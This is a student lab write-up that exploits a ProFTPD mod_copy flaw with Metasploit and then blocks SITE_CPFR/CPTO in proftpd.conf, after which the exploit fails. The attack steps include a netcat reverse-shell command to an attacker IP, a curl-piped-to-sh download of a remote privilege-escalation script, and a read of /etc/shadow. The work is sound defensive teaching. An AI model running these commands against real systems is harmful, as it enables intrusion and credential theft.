# 📃 Phase 3: Defensive Strategy

---

# 🛡️ 1. BEFORE Defense - Full Successful Exploitation (from Phase 1)

## Step 1: Scan Victim with Nmap
```bash
nmap -sV 10.0.2.15
```
![10-nmap-scan-results.png](../phase1/screenshots/10-nmap-scan-results.png)

## Step 2: Launch Metasploit Console
```bash
msfconsole
```
![11-launch-msfconsole.png](../phase1/screenshots/11-launch-msfconsole.png)

## Step 3: Search for mod_copy Exploit
```bash
search mod_copy
```
![12-search-mod_copy-exploit.png](../phase1/screenshots/12-search-mod_copy-exploit.png)

## Step 4: Select Exploit Module
```bash
use 0
```
![13-select-mod_copy-exploit.png](../phase1/screenshots/13-select-mod_copy-exploit.png)

## Step 5: Show Options
```bash
show options
```
![14-show-exploit-options.png](../phase1/screenshots/14-show-exploit-options.png)

## Step 6: Set RHOSTS and SITEPATH
```bash
set RHOSTS 10.0.2.15
set SITEPATH /var/www/html
```
![15-set-RHOST-to-victim-ip.png](../phase1/screenshots/15-set-RHOST-to-victim-ip.png)
![16-set-SITEPATH-to-var-www-html.png](../phase1/screenshots/16-set-SITEPATH-to-var-www-html.png)

## Step 7: Show Payloads
```bash
show payloads
```
![17-show-compatible-payloads.png](../phase1/screenshots/17-show-compatible-payloads.png)

## Step 8: Set Payload
```bash
set payload 5
```
![18-set-generic-reverse-shell-payload.png](../phase1/screenshots/18-set-generic-reverse-shell-payload.png)

## Step 9: Show Payload Options
```bash
show payload options
```
![19-verify-payload-options.png](../phase1/screenshots/19-verify-payload-options.png)

## Step 10: Set Reverse Shell Command
```bash
set CMD /tmp/mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.2.6 4444 > /tmp/f
```
![20-set-CMD-netcat-reverse-shell.png](../phase1/screenshots/20-set-CMD-netcat-reverse-shell.png)

## Step 11: Allow No Cleanup
```bash
set AllowNoCleanup true
```
![21-set-AllowNoCleanup-true.png](../phase1/screenshots/21-set-AllowNoCleanup-true.png)

## Step 12: Start Netcat Listener
```bash
nc -lnvp 4444
```
![22-start-netcat-listener.png](../phase1/screenshots/22-start-netcat-listener.png)

## Step 13: Run Exploit
```bash
run
```
![23-run-exploit.png](../phase1/screenshots/23-run-exploit.png)

## Step 14: Confirm Shell Access
```bash
whoami
```
![24-successful-reverse-shell-access.png](../phase1/screenshots/24-successful-reverse-shell-access.png)

## Step 15: Gain Root Privileges
```bash
sh -c "$(curl -fsSL https://raw.githubusercontent.com/A0-2H/ICS344-CourseProject/main/phase1/custom/escalate.sh)"
whoami
```
![25-run-lightpeas-script.png](../phase1/screenshots/25-run-lightpeas-script.png)
![26-lightpeas-enumeration-results.png](../phase1/screenshots/26-lightpeas-enumeration-results.png)

## Step 16: View /etc/shadow File
```bash
cat /etc/shadow
```
![27-run-escalate-script-and-root-access.png](../phase1/screenshots/27-run-escalate-script-and-root-access.png)

---

# 🔨 2. Defense - Secure ProFTPD Configuration

## Step 1: Edit proftpd.conf to Block mod_copy Commands
```bash
sudo nano /opt/proftpd/etc/proftpd.conf
```
![1-open-proftpd-conf.png](./screenshots/1-open-proftpd-conf.png)

Scroll to the bottom and add:
```apache
<Limit SITE_CPFR>
  DenyAll
</Limit>
<Limit SITE_CPTO>
  DenyAll
</Limit>
```
![2-scroll-to-bottom-proftpd-conf.png](./screenshots/2-scroll-to-bottom-proftpd-conf.png)
![3-add-denyall-blocks.png](./screenshots/3-add-denyall-blocks.png)

Save and exit.
![4-save-changes-proftpd.png](./screenshots/4-save-changes-proftpd.png)

## Step 2: Restart ProFTPD Service
```bash
sudo service proftpd restart
```
![5-restart-proftpd.png](./screenshots/5-restart-proftpd.png)

---

# 🔫 3. AFTER Defense - Exploit Attempt Fails

## Step 1: Re-scan Victim Machine
```bash
nmap -sV 10.0.2.15
```
![6-re-run-nmap.png](./screenshots/6-re-run-nmap.png)

## Step 2: Relaunch Metasploit
```bash
msfconsole
```
![7-re-launch-msfconsole.png](./screenshots/7-re-launch-msfconsole.png)

## Step 3: Search for mod_copy Again
```bash
search mod_copy
```
![8-search-modcopy-again.png](./screenshots/8-search-modcopy-again.png)

## Step 4: Configure Exploit Again
```bash
use exploit/unix/ftp/proftpd_modcopy_exec
show options
set RHOSTS 10.0.2.15
set SITEPATH /var/www/html
```
![9-set-rhosts-and-sitepath-again.png](./screenshots/9-set-rhosts-and-sitepath-again.png)

## Step 5: Set Payload and Reverse Shell Command
```bash
show payloads
set payload 5
show payload options
set CMD /tmp/mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.2.6 4444 > /tmp/f
set AllowNoCleanup true
```
![10-show-payloads-error.png](./screenshots/10-show-payloads-error.png)
![11-show-options-and-set-cmd.png](./screenshots/11-show-options-and-set-cmd.png)

## Step 6: Start Netcat Listener Again
```bash
nc -lnvp 4444
```
![12-start-netcat-listener-again.png](./screenshots/12-start-netcat-listener-again.png)

## Step 7: Run Exploit Again
```bash
run
```
![13-run-exploit-again-fails.png](./screenshots/13-run-exploit-again-fails.png)

## Step 8: Attempt whoami - No Shell Access
```bash
whoami
```
![14-whoami-fails.png](./screenshots/14-whoami-fails.png)

---

# ✅ Conclusion

| Step | Result |
|:----|:------|
| Initial Exploitation (Phase 1) | ✅ Successful |
| Defense Implemented (Phase 3) | ✅ Successful |
| Exploitation Attempt After Defense | ❌ Failed |

- The ProFTPD service is now secured and no longer exploitable via `mod_copy` vulnerability.

---
